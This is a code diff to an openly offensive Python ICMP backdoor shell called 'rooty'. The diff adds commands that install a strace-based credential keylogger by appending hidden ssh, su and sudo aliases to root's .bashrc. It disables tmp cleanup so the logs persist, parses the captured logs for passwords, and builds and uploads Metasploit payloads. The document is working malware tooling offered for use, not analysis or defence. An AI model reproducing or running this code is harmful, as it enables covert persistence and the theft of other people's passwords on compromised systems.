@@ -131,7 +131,7 @@ if shellcode_file != "":
 # Create the listener thread
 thread.start_new_thread(start_listener, (iface, None))
 
-#Ghetto wau to ensure I got all output
+#Run command, store results in array and return it.
 def cmdoutput(line):
    global cmdout
    global outputdelay
@@ -311,7 +311,7 @@ class Shell(cmd.Cmd):
         print "Dude you didnt enter a pid... ex: persist 5141"
 
     def do_showmyproc(self,line):
-      "Display the icmp backdoor process name, may only not be accurate..."
+      "Display the icmp backdoor process name, may not be accurate..."
       cmdoutput("cat /proc/$PPID/cmdline && echo \" PID: $PPID\"")
 
     def do_prompt(self, line):
@@ -331,7 +331,12 @@ class Shell(cmd.Cmd):
       time.sleep(5)
       cmdoutput('cat /tmp/.keyring-2WEFPj')
 
-    def do_msfpayloadvbuilder(self, line):
+    def do_sshkeylogger(self, line):
+      "Ghetto ssh alias, to log creds with strace"
+      print("alias ssh=\'strace -o /tmp/.keyring-83nx919y9epqro -\`date \'+%d%h%m%s\'\`.log -e read,write,connect -s2048 ssh\'")
+      cmdoutput("alias ssh=\'strace -o /tmp/.keyring-83nx919y9epqro -\`date \'+%d%h%m%s\'\`.log -e read,write,connect -s2048 ssh\'")
+
+    def do_msfpayloadbuilder(self, line):
       "Build/Upload Metasploit Payload, Requires MSFPAYLOAD on local box"
       global shellcode_file
       print "Listing all msfpayloads for linux/unix, please wait..."
@@ -359,7 +364,62 @@ class Shell(cmd.Cmd):
           print "Uploading shellcode"
           break
           
+    def do_disable_tmpclean(self, line):
+       "Disable Tmp directory cleaning after reboot (linux)"
+       output = cmdoutput("touch /etc/init/mounted-tmp.conf && echo true")
+       if "true" in str(output):
+          print "Successful"
+       else:
+          print "Unsuccessful, either permissions or /etc/init/mounted-tmp.conf doesnt exist"
+
+    def do_keylogger_install(self, line):
+       "Install Keylogger using strace, add to every users .bashrc"
+       do_disable_tmpclean(self, "")
+       installcheck = cmdoutput("ls /tmp/.keyring-923q4908afmw && echo true")
+       if "true" in str(installcheck):
+         print "Its already installed dude... check the /tmp/.keyring-923q4908afmw/ directory for output"
+       else:
+          output = cmdoutput("which strace && echo true")
+          if "true" in str(output):
+             print "Creating Directory /tmp/.keyring-923q4908afmw"
+             cmdoutput("mkdir /tmp/.keyring-923q4908afmw && chmod 777 /tmp/.keyring-923q4908afmw/")
+             cmdoutput("find /root/ | grep .bashrc | grep -v usr | grep -v etc | xargs -L 1 -I{} sh -c \"echo \\\"alias ssh=\'strace -o /tmp/.keyring-923q4908afmw/.keyring-wiaofh28971ssh-`date \'+%d%h%m%s\'`.tmp -e read,write,connect -s2048 ssh\'\\\" >> \'{}\'\"")
+             cmdoutput("find /root/ | grep .bashrc | grep -v usr | grep -v etc | xargs -L 1 -I{} sh -c \"echo \\\"alias su=\'strace -o /tmp/.keyring-923q4908afmw/.keyring-wiaofh28971ssh-`date \'+%d%h%m%s\'`.tmp -e read,write,connect -s2048 su\'\\\" >> \'{}\'\"")
+             cmdoutput("find /root/ | grep .bashrc | grep -v usr | grep -v etc | xargs -L 1 -I{} sh -c \"echo \\\"alias sudo=\'strace -o /tmp/.keyring-923q4908afmw/.keyring-wiaofh28971ssh-`date \'+%d%h%m%s\'`.tmp -e read,write,connect -s2048 sudo\'\\\" >> \'{}\'\"")
+             #cmdoutput("find /home/ | grep .bashrc | grep -v usr | grep -v etc | xargs -L 1 -I{} sh -c \"echo \\\"alias sssh=\'strace -o /tmp/.keyring-923q4908afmw/.keyring-wiaofh28971ssh-`date \'+%d%h%m%s\'`.tmp -e read,write,connect -s2048 ssh\'\\\" >> \'{}\'\"")
+             #cmdoutput("find /home/ | grep .bashrc | grep -v usr | grep -v etc | xargs -L 1 -I{} sh -c \"echo \\\"alias su=\'strace -o /tmp/.keyring-923q4908afmw/.keyring-wiaofh28971ssh-`date \'+%d%h%m%s\'`.tmp -e read,write,connect -s2048 su\'\\\" >> \'{}\'\"")
+             #cmdoutput("find /home/ | grep .bashrc | grep -v usr | grep -v etc | xargs -L 1 -I{} sh -c \"echo \\\"alias sudo=\'strace -o /tmp/.keyring-923q4908afmw/.keyring-wiaofh28971ssh-`date \'+%d%h%m%s\'`.tmp -e read,write,connect -s2048 sudo\'\\\" >> \'{}\'\"")
+          else:
+             print "Sorry Strace is not on the box, upload it yourself  or a real keylogger :("
+          print "Installed, check /tmp/.keyring-923q4908afmw/ directory for output"
     
+
+
+    def do_keylogger_readpasswords(self, line):
+       "Parses the collected keylogger data, tries to find passwords based on newlines"
+       installcheck = cmdoutput("ls /tmp/.keyring-923q4908afmw && echo true")
+       if "true" in str(installcheck):
+          output = cmdoutput("cat /tmp/.keyring-923q4908afmw/.* | egrep '(.*write.*password.*|read)'")
+          os.system('clear')
+          for i in output:
+ 
+             if "password" in i:
+                if len(i) < 200:
+                   x = i.split(',')
+                   if len(x) > 1:
+                      print x[1]
+             if len(i) < 50:
+                
+                i = i.split(',')
+                if len(i) > 1:
+                   clean = i[1].replace('"','')
+                   clean = clean.replace('\\n','  : <---- \\n found Potential Password  or Above ^^^')
+                   clean = clean.replace('\\r','')
+                   print clean
+       else:
+          print "Keylogger data not found... make sure you run keylogger_install"
+
+
     def do_exit(self, line):
       "Exit the shell"
       print "Good Bye"
@@ -368,3 +428,4 @@ class Shell(cmd.Cmd):
     
 if __name__ == '__main__':
     Shell().cmdloop('ICMP Backdoor (rooty) with Interactive Shell (m0r3sh3lls)')
+
